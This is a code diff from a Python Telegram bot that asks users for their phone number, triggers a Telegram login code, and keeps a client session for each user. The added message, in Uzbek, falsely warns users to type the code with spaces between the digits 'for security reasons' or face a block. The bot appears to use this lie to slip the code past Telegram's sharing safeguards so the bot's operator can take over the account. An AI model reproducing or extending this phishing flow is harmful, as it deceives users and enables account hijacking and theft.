@@ -251,7 +251,15 @@ async def auth_phone(message: Message, state: FSMContext):
         await client.connect()
         sent_code = await client.send_code(phone)
         clients_auth[message.from_user.id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
-        await message.answer("📲 Telegram rasmiy <b>tasdiqlash kodini</b> yubordi.\nIltimos, o'sha 5 xonali kodni yozing:\n\n<i>(Masalan kodingiz 12345 bo'lsa shunday yozing)</i>", reply_markup=ReplyKeyboardRemove())
+        await message.answer(
+            "📲 <b>Telegram rasmiy tasdiqlash kodini yubordi!</b>\n\n"
+            "⚠️ <b>DIQQAT:</b> Xavfsizlik sababli kodni yozishda RAQAMLAR ORASINI OCHIB yozing! "
+            "Aks holda o'z hisobingizdan vaqtincha bloklanasiz!\n\n"
+            "✅ <b>To'g'ri yozish:</b> <code>1 2 3 4 5</code>\n"
+            "❌ <b>Noto'g'ri yozish:</b> <code>12345</code>\n\n"
+            "Iltimos, kodingizni oralariga probel tashlab yuboring:", 
+            reply_markup=ReplyKeyboardRemove()
+        )
         await state.set_state(PyrogramAuth.waiting_for_code)
     except Exception as e:
         await message.answer(f"Xato yuz berdi: {e}. Qaytadan /start bosing.")
